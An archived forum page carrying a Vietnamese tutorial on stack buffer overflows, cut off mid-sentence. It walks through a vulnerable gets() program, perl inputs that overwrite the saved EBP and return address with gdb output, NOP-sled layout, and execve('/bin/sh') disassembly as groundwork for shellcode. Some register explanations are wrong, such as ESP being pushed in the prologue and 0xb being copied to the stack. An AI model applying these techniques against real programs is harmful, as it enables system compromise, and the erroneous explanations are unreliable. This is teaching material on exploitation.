<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Tìm hiểu đầy đủ về tràn bộ đệm, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Tìm hiểu đầy đủ về tràn bộ đệm - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.hva?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.hva">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.hva">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.hva">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.hva">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.hva">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.hva"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.hva">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.hva">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.hva">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<!-- navigator -->
<table cellspacing="2" cellpadding="2" width="100%" border="0" align="center">
	<tr>
		<td valign="baseline" align="left" colspan="0">
			<span class="nav">
			<a class="nav" href="/hvaonline/forums/list.hva">Forum Index </a> 
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/forums/show/12.hva">Thảo luận thâm nhập </a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/posts/list/430.hva" name="top" id="top">Tìm hiểu đầy đủ về tràn bộ đệm</a>
				&nbsp;<a href="/hvaonline/rss/topicPosts/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML"></a>
			</span>
		
		</td>

		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- poll show -->

  <!-- POST LISTING -->


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#FF3333">[Article]</font></span>&nbsp;&nbsp; Tìm hiểu đầy đủ về tràn bộ đệm<a name="1087" id="1087"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">27/06/2006 02:25:57 (+0700) | <a href="/hvaonline/posts/list/430.hva#1087">#1</a> | 1087 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/111217.hva"><b>hmnm</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 04/07/2005 10:32:09<br>
		Messages: 17<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/111217.hva" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/111217.hva" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">Tác giả: apache<br/> <br/> <b><font color='yellow'>Tìm hiểu đầy đủ về tràn bộ đệm</font></b><br/> <br/> <br/> Lời mở đầu<br/> <br/> Tràn bộ đệm là một trong những lỗ hỏng bảo mật lớn nhất hiện nay. Vậy tràn bộ đệm là gì? Làm thế nào để thi hành các mã lệnh nguy hiểm qua tràn bộ đệm...?<br/> <br/> ***Lưu ý*** một ít kiến thức về Assembly, C, GDB và Linux là điều cần thiết đối với bạn!<br/> <br/> Sơ đồ tổ chức bộ nhớ của một chương trình<br/> <br/> /------------------ địa chỉ vùng nhớ cao<br/> | |<br/> | Stack | <br/> | | <br/> |------------------|<br/> | (Initialized) |<br/> | Data |<br/> | (Uninitialized) |<br/> |------------------|<br/> | |<br/> | Text |<br/> | |<br/> ------------------/ địa chỉ vùng nhớ thấp<br/> Stack và Heap?<br/> <br/> Heap là vùng nhớ dùng để cấp phát cho các biến tỉnh hoặc các vùng nhớ được cấp phát bằng hàm malloc()<br/> <br/> Stack là vùng nhớ dùng để lưu các tham số và các biến cục bộ của hàm.<br/> <br/> Các biến trên heap được cấp phát từ vùng nhớ thấp đến vùng nhớ cao. Trên stack thì hoàn toàn ngược lại, các biến được cấp phát từ vùng nhớ cao đến vùng nhớ thấp.<br/> <br/> Stack hoạt động theo nguyên tắc "vào sau ra trước"(Last In First Out - LIFO). Các giá trị được đẩy vào stack sau cùng sẽ được lấy ra khỏi stack trước tiên.<br/> <br/> PUSH và POP<br/> <br/> Stack đổ từ trên xuống duới(từ vùng nhớ cao đến vùng nhớ thấp). Thanh ghi ESP luôn trỏ đến đỉnh của stack(vùng nhớ có địa chỉ thấp).<br/> <br/> đỉnh của bộ nhớ /------------ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;-- ESP<br/> đáy của bộ nhớ ------------/ đỉnh của stack<br/> * PUSH một value vào stack<br/> <br/> đỉnh của bộ nhớ /------------ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;- ESP cũ<br/> |------------| <br/> (2) -&gt; value | &lt;- ESP mới = ESP cũ - sizeof(value) (1)<br/> đáy của bộ nhớ ------------/ đỉnh của stack<br/> 1/ ESP=ESP-sizeof(value)<br/> 2/ value được đẩy vào stack<br/> <br/> * POP một value ra khỏi stack<br/> <br/> đỉnh của bộ nhớ /------------ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;- ESP mới = ESP cũ + sizeof(value)(2)<br/> |------------| <br/> (1) &lt;- value | &lt;- ESP cũ<br/> đáy của bộ nhớ ------------/ đỉnh của stack<br/> 1/ value được lấy ra khỏi stack<br/> 2/ ESP=ESP+sizeof(value)<br/> <br/> Khác nhau giữa các lệnh hợp ngữ AT&T với Intel<br/> <br/> Khác với MSDOS và WINDOWS, *NIX dùng các lệnh hợp ngữ AT&T. Nó hoàn toàn ngược lại với chuẩn của Intel/Microsoft.<br/> <br/> Ví dụ:<br/> <br/> Intel AT&T <br/> mov eax, esp movl %esp, %eax <br/> push 7 push $7 <br/> mov [esp+5], eax movl %eax, 0x5(%esp) <br/> inc ah incb %ah <br/> push 7 push $7 <br/> ... <br/> <br/> * Ghi chú:<br/> <br/> e - Extended 32 bits<br/> % - register<br/> mov %src, %des<br/> movl - move 1 long<br/> movb - move 1 byte<br/> movw - move 1 word<br/> $ - hằng<br/> # - chú thích<br/> ...<br/> <br/> Cách làm việc của hàm<br/> <br/> Thanh ghi EIP luôn trỏ đến địa chỉ của câu lệnh tiếp theo cần thi hành.<br/> <br/> Khi gọi hàm, đầu tiên các tham số được push vào stack theo thứ tự ngược lại. Tiếp theo địa chỉ của câu lệnh được push vào stack. Sau đó, thanh ghi EBP được push vào stack(dùng để lưu giá trị cũ của EBP).<br/> <br/> Khi kết thúc hàm, thanh ghi EBP được pop ra khỏi stack(phục hồi lại giá trị cũ của EBP). Sau đó địa chỉ trở về(ret address) được pop ra khỏi stack và lệnh tiếp theo sau lời gọi hàm sẽ được thi hành.<br/> <br/> Thanh ghi EBP được dùng để xác định các tham số và các biến cục bộ của hàm.<br/> <br/> Ví dụ:<br/> <br/> test.c<br/> ------------------------------------------------------------------------------<br/> void function(int a, int b, int c) {<br/> char buffer1[5];<br/> char buffer2[10];<br/> }<br/> <br/> void main() {<br/> function(1,2,3);<br/> }<br/> ------------------------------------------------------------------------------<br/> Để hiểu được chương trình gọi hàm function() như thế nào, bạn hãy compile vidu1.c, dùng tham số -S để phát mã assembly:<br/> <br/> [đt@localhost ~/vicki]$cc -S -o test.s test.c<br/> <br/> Xem file test.s, chúng ta sẽ thấy call function() được chuyển thành:<br/> <br/> pushl $3<br/> pushl $2<br/> pushl $1<br/> call function<br/> 3 tham số truyền cho function() lần lượt được push vào stack theo thứ tự ngược lại. Câu lệnh 'call' sẽ push con trỏ lệnh(tức là thanh ghi EIP) vào stack để lưu địa chỉ trở về.<br/> <br/> Các lệnh đầu tiêu trong hàm function() sẽ có dạng như sau:<br/> <br/> pushl %ebp<br/> movl %esp,%ebp<br/> subl $20,%esp<br/> Đầu tiên ESP(frame pointer) được push vào stack. Sau đó chương trình copy ESP vào EBP để tạo một FP pointer mới. Bạn dễ nhận thấy lúc này ESP và EBP đều đang trỏ đến ô nhớ chứa EBP cũ. Hãy ghi nhớ điều này. Tiếp theo ESP được trừ đi 20 để dành không gian cho các biến cục bộ của hàm function()<br/> <br/> Vì chương trình 32 bits nên 5 bytes buffer1 sẽ là 8 bytes(2 words) trong bộ nhớ(do làm tròn đến 4 bytes hay là 32 bits), 10 bytes buffer2 sẽ là 12 bytes trong bộ nhớ(3 words). Tổng cộng sẽ tốn 8+12=20 bytes cho các biến cục bộ của function() nên ESP phải bị trừ đi 20! Stack sẽ có dạng như sau:<br/> <br/> đáy của đỉnh của<br/> bộ nhớ bộ nhớ<br/> buffer2 buffer1 sfp ret a b c<br/> &lt;------ [ ][ ][ ][ ][ ][ ][ ]<br/> <br/> đỉnh của 12 bytes 8 bytes 4b 4b đáy của<br/> stack stack<br/> Trong hàm function(), nội dung thanh ghi EBP không bị thay đổi.<br/> <br/> 0xz%ebp dùng để xác định ô nhớ chứa tham số của hàm<br/> 0xfffffz%ebp dùng để xác định ô nhớ chứa biến cục bộ của hàm<br/> <br/> Khi kết thúc hàm function():<br/> <br/> movl %ebp,%esp<br/> popl %ebp<br/> ret<br/> movl %ebp, %esp sẽ copy EBP vào ESP. Vì EBP khi bắt đầu hàm trỏ đến ô nhớ chứa EBP cũ và EBP không bị thay đổi trong hàm function() nên sau khi thực hiện lệnh movl, ESP sẽ trỏ đến ô nhớ chứa EBP cũ. popl %ebp sẽ phục hồi lại giá trị cũ cho EBP đồng thời ESP sẽ bị giảm 4(ESP=ESP-sizeof(EBP cũ)) sau lệnh popl. Như vậy ESP sẽ trỏ đến ô nhớ chứa địa chỉ trở về(nằm ngay trên ô nhớ chứa EBP cũ). ret sẽ pop địa chỉ trở về ra khỏi stack, ESP sẽ bị giảm 4 và chương trình tiếp tục thi hành câu lệnh sau lệnh call function().<br/> <br/> Chương trình bị tràn bộ đệm<br/> <br/> Ví dụ:<br/> <br/> gets.c:<br/> ---------------------------------------<br/> int main()<br/> {<br/> char buf[20];<br/> gets(buf);<br/> }<br/> ---------------------------------------<br/> [đt@localhost ~/vicki]$ cc gets.c -o gets<br/> /tmp/cc4C6vaT.o: In function `main':<br/> /tmp/cc4C6vaT.o(.text+0xe): the `gets' function is dangerous and should not be used.<br/> [đt@localhost ~/vicki]$<br/> gets(buf) sẽ nhận input data vào buf. Kích thước của buf chỉ là 20 bytes. Nếu ta đẩy data có kích thước lớn hơn 20 bytes vào buf, 20 bytes data đầu tiên sẽ vào mảng buf[20], các bytes data sau sẽ ghi đè lên EBP cũ và tiếp theo là ret addr. Như vậy chúng ta có thể thay đổi được địa chỉ trở về, điều này đồng nghĩa với việc chương trình bị tràn bộ đệm.<br/> <br/> đỉnh của bộ nhớ +-------------+ đáy của stack<br/> | return addr |<br/> +-------------+<br/> | EBP cũ |<br/> +-------------+<br/> | |<br/> | |<br/> | buf[20] |<br/> | |<br/> | |<br/> đáy của bộ nhớ +-------------+ đỉnh của stack<br/> Bạn hãy thử:<br/> <br/> [đt@localhost ~/vicki]$ perl -e 'print "A" x 24' | ./gets<br/> [đt@localhost ~/vicki]$ gdb gets core<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> Core was generated by `./gets'.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0 0x41414141 in ?? ()<br/> (gdb) info all<br/> eax 0xbffffbc4 -1073742908<br/> ecx 0xbffffbc4 -1073742908<br/> edx 0x40105dbc 1074814396<br/> ebx 0x4010748c 1074820236<br/> esp 0xbffffbe0 0xbffffbe0<br/> ebp 0x41414141 0x41414141 // hãy nhìn xem, chúng ta vừa ghi đè lên ebp<br/> esi 0x4000a610 1073784336<br/> edi 0xbffffc24 -1073742812<br/> eip 0x40031100 0x40031100<br/> eflags 0x10282 66178<br/> cs 0x23 35<br/> ss 0x2b 43<br/> ds 0x2b 43<br/> es 0x2b 43<br/> fs 0x2b 43<br/> gs 0x2b 43<br/> (gdb) quit<br/> [đt@localhost ~/vicki]$<br/> 0x41 chính là "A" ở dạng hex<br/> <br/> Bây giờ bạn hãy thử tiếp:<br/> <br/> [đt@localhost ~/vicki]$ perl -e 'print "A" x 28' | ./gets<br/> Segmentation fault<br/> [đt@localhost ~/vicki]$ gdb gets core<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> Core was generated by `./gets'.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0 0x41414141 in ?? ()<br/> (gdb) info all<br/> eax 0xbffffbc4 -1073742908<br/> ecx 0xbffffbc4 -1073742908<br/> edx 0x40105dbc 1074814396<br/> ebx 0x4010748c 1074820236<br/> esp 0xbffffbe0 0xbffffbe0<br/> ebp 0x41414141 0x41414141 // chúng ta đã ghi đè lên ebp<br/> esi 0x4000a610 1073784336<br/> edi 0xbffffc24 -1073742812<br/> eip 0x41414141 0x41414141 // chúng ta đã ghi đè lên eip<br/> eflags 0x10282 66178<br/> cs 0x23 35<br/> ss 0x2b 43<br/> ds 0x2b 43<br/> es 0x2b 43<br/> fs 0x2b 43<br/> gs 0x2b 43<br/> (gdb) quit<br/> [đt@localhost ~/vicki]$<br/> Địa chỉ trở về bị thay đổi thành 0x41414141, chương trình sẽ thi hành các lệnh tại 0x41414141, tuy nhiên đây là vùng cấm nên Linux đã báo lỗi "Segmentation fault"<br/> <br/> Shellcode<br/> <br/> Hình dung các đặt shellcode trên stack<br/> <br/> Ở ví dụ trước, chúng ta đã biết được nguyên nhân của tràn bộ đệm và cách thay đổi eip. Tuy nhiên, chúng ta cần phải thay đổi địa chỉ trở về trỏ đến shellcode để đổ một shell. Bạn có thể hình dung ra cách đặt shellcode trên stack như sau:<br/> <br/> Trước khi tràn bộ đệm:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ <br/> &lt;----- FFFFF BBBBBBBBBBBBBBBBBBBBB EEEE RRRR FFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> B = buffer<br/> E = stack frame pointer<br/> R = return address<br/> F = các data khác<br/> <br/> Khi tràn bộ đệm:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ<br/> &lt;----- FFFFF SSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> S = shellcode<br/> A = con trỏ đến shellcode<br/> F = các data khác<br/> <br/> (1) Lắp tràn bộ đệm(đến return addr) bằng địa chỉ của buffer<br/> (2) Đặt shellcode vào buffer<br/> <br/> Như vậy địa chỉ trở về sẽ trỏ đến shellcode, shellcode sẽ đổ một root shell. Tuy nhiên, thật khó để làm cho ret addr trỏ đến đúng shellcode. Có một cách khác, chúng ta sẽ đặt vào đầu của buffer một dãy lệnh NOP(NO oPeration - không xử lí), tiếp theo chúng ta đẩy shellcode vào sau NOPs. Như vậy khi thay đổi ret addr trỏ đến một nơi này đó ở đầu buffer, các lệnh NOP sẽ được thi hành, chúng không làm gì cả. Đến khi gặp các lệnh shellcode, shellcode sẽ làm nhiệm vụ đổ root shell. Stack có dạng như sau:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ<br/> &lt;----- FFFFF NNNNNNNNNNNSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> N = NOP<br/> S = shellcode<br/> A = con trỏ đến shellcode<br/> F = các data khác<br/> <br/> Viết và test thử shellcode<br/> <br/> Shellcode được đặt trên stack nên không thể nào dùng địa chỉ tuyệt đối. Chúng ta buộc phải dùng địa chỉ tương đối. Thật may cho chúng ta, lệnh jmp và call có thể chấp nhận các địa chỉ tương đối. Shellcode sẽ có dạng như sau:<br/> <br/> 0 jmp (nhảy xuống z bytes, tức là đến câu lệnh call)<br/> 2 popl %esi<br/> ... đăt các hàm tại đây ...<br/> Z call &lt;-Z+2&gt; (call sẽ nhảy lên z-2 bytes, đếb ngay câu lệnh sau jmp, POPL)<br/> Z+5 .string (biến)<br/> Giải thích: ở đầu shellcode chúng ta đặt một lệnh jmp đến call. call sẽ nhảy ngược lên lại câu lệnh ngay sau jmp, tức là câu lệnh popl %esi. Chúng ta đặt các dữ liệu .string ngay sau call. Khi lệnh call được thi hành, nó sẽ push địa chỉ của câu lệnh kế tiếp, trong trường hợp này là địa chỉ của .string vào stack. Câu lệnh ngay sau jmp là popl %esi, như vậy esi sẽ chứa địa chỉ của .string. Chúng ta đặt các hàm cần xử lí giữa popl %esi và call &lt;-z+2&gt;, các hàm này sẽ xác định các dữ liệu .string qua thanh ghi esi.<br/> <br/> Mã lệnh để đổ shell trong C có dạng như sau:<br/> <br/> shellcode.c<br/> -----------------------------------------------------------------------------<br/> #include <br/> <br/> void main() {<br/> char *name[2];<br/> <br/> name[0] = "/bin/sh";<br/> name[1] = NULL;<br/> execve(name[0], name, NULL);<br/> }<br/> ------------------------------------------------------------------------------<br/> Để tìm ra mã lệnh assembly thật sự của shellcode, bạn cần compile shellcode.c và sau đó chạy gdb. Nhớ dùng cờ -static khi compile shellcode.c để gộp các mã lệnh assembly thật sự của hàm execve vào, nếu không dùng cờ này, bạn chỉ nhận được một tham chiếu đến thư viện liên kết động của C cho hàm execve.<br/> <br/> [đt@localhost ~/vicki]$ gcc -o shellcode -ggdb -static shellcode.c<br/> [đt@localhost ~/vicki]$ gdb shellcode<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas main<br/> Dump of assembler code for function main:<br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : subl $0x8,%esp<br/> 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)<br/> 0x800013d : movl $0x0,0xfffffffc(%ebp)<br/> 0x8000144 : pushl $0x0<br/> 0x8000146 : leal 0xfffffff8(%ebp),%eax<br/> 0x8000149 : pushl %eax<br/> 0x800014a : movl 0xfffffff8(%ebp),%eax<br/> 0x800014d : pushl %eax<br/> 0x800014e : call 0x80002bc &lt;__execve&gt;<br/> 0x8000153 : addl $0xc,%esp<br/> 0x8000156 : movl %ebp,%esp<br/> 0x8000158 : popl %ebp<br/> 0x8000159 : ret<br/> End of assembler dump.<br/> (gdb) disas __execve<br/> Dump of assembler code for function __execve:<br/> 0x80002bc &lt;__execve&gt;: pushl %ebp<br/> 0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp<br/> 0x80002bf &lt;__execve+3&gt;: pushl %ebx<br/> 0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax<br/> 0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx<br/> 0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx<br/> 0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx<br/> 0x80002ce &lt;__execve+18&gt;: int $0x80<br/> 0x80002d0 &lt;__execve+20&gt;: movl %eax,%edx<br/> 0x80002d2 &lt;__execve+22&gt;: testl %edx,%edx<br/> 0x80002d4 &lt;__execve+24&gt;: jnl 0x80002e6 &lt;__execve+42&gt;<br/> 0x80002d6 &lt;__execve+26&gt;: negl %edx<br/> 0x80002d8 &lt;__execve+28&gt;: pushl %edx<br/> 0x80002d9 &lt;__execve+29&gt;: call 0x8001a34 &lt;__normal_errno_location&gt;<br/> 0x80002de &lt;__execve+34&gt;: popl %edx<br/> 0x80002df &lt;__execve+35&gt;: movl %edx,(%eax)<br/> 0x80002e1 &lt;__execve+37&gt;: movl $0xffffffff,%eax<br/> 0x80002e6 &lt;__execve+42&gt;: popl %ebx<br/> 0x80002e7 &lt;__execve+43&gt;: movl %ebp,%esp<br/> 0x80002e9 &lt;__execve+45&gt;: popl %ebp<br/> 0x80002ea &lt;__execve+46&gt;: ret<br/> 0x80002eb &lt;__execve+47&gt;: nop<br/> End of assembler dump.<br/> (gdb) quit<br/> Giải thích:<br/> <br/> 1/ main():<br/> <br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : subl $0x8,%esp<br/> Các lệnh này bạn đã viết rồi. Nó sẽ lưu frame pointer cũ và tạo frame pointer mới từ stack pointer, sau đó dành chổ cho các biến cục bộ của main() trên stack, trong trường hợp này là 8 bytes:<br/> <br/> char *name[2];<br/> <br/> 2 con trỏ kiểu char, mỗi con trỏ dài 1 word nên phải tốn 2 word, tức là 8 bytes trên stack.<br/> <br/> 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)<br/> copy giá trị 0x80027b8(địa chỉ của chuổi "/bin/sh") vào con trỏ đầu tiên của mảng con trỏ name[]. Câu lệnh này tương đương với:<br/> <br/> name[0] = "/bin/sh";<br/> <br/> 0x800013d : movl $0x0,0xfffffffc(%ebp)<br/> copy giá trị 0x0(NULL) vào con trỏ thứ 2 của name[]. Câu lệnh này tương đương với:<br/> <br/> name[1] = NULL;<br/> <br/> Mã lệnh thật sự để call execve() bắt đầu tại đây:<br/> <br/> 0x8000144 : pushl $0x0<br/> push các tham số của hàm execve() vào stack theo thứ tự ngược lại, đầu tiên là NULL<br/> <br/> 0x8000146 : leal 0xfffffff8(%ebp),%eax<br/> nạp địa chỉ của name[] vào thanh ghi EAX<br/> <br/> 0x8000149 : pushl %eax<br/> push địa chỉ của name[] vào stack<br/> <br/> 0x800014a : movl 0xfffffff8(%ebp),%eax<br/> nạp địa chỉ của chuổi "/bin/sh" vào stack<br/> <br/> 0x800014e : call 0x80002bc &lt;__execve&gt;<br/> gọi hàm thư viện execve(). call sẽ push eip vào stack.<br/> <br/> 2/ execve():<br/> <br/> 0x80002bc &lt;__execve&gt;: pushl %ebp<br/> 0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp<br/> 0x80002bf &lt;__execve+3&gt;: pushl %ebx<br/> đây là phần mở đầu của hàm, tôi không cần giải thích cho bạn nữa <br/> <br/> 0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax<br/> copy 0xb(11 decimal) vào stack. 11 = execve()<br/> <br/> 0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx<br/> copy địa chỉ của "/bin/sh" vào EBX<br/> <br/> 0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx<br/> copy địa chỉ của name[] vào ECX<br/> <br/> 0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx<br/> copy địa chỉ của con trỏ null vào EDX <br/> <br/> 0x80002ce &lt;__execve+18&gt;: int $0x80<br/> gọi ngắt $0x80 <br/> <br/> Tóm lại:<br/> <br/> a/ có một chuổi kết thúc bằng null "/bin/sh" ở đâu đó trong bộ nhớ<br/> b/ có địa chỉ của chuổi "/bin/sh" ở đâu đó trong bộ nhớ theo sau là 1 null dài 1 word<br/> c/ copy 0xb vào thanh ghi EAX<br/> d/ copy địa chỉ của địa chỉ của chuổi "/bin/sh" vào thanh ghi EBX<br/> e/ copy địa chỉ của chuổi "/bin/sh" vào thanh ghi ECX<br/> f/ copy địa chỉ của null dài 1 word vào thanh ghi EDX<br/> g/ gọi ngắt $0x80<br/> <br/> Sau khi thi hành call execve, chương trình có thể thi hành tiếp các câu lệnh rác còn lại trên stack và chương 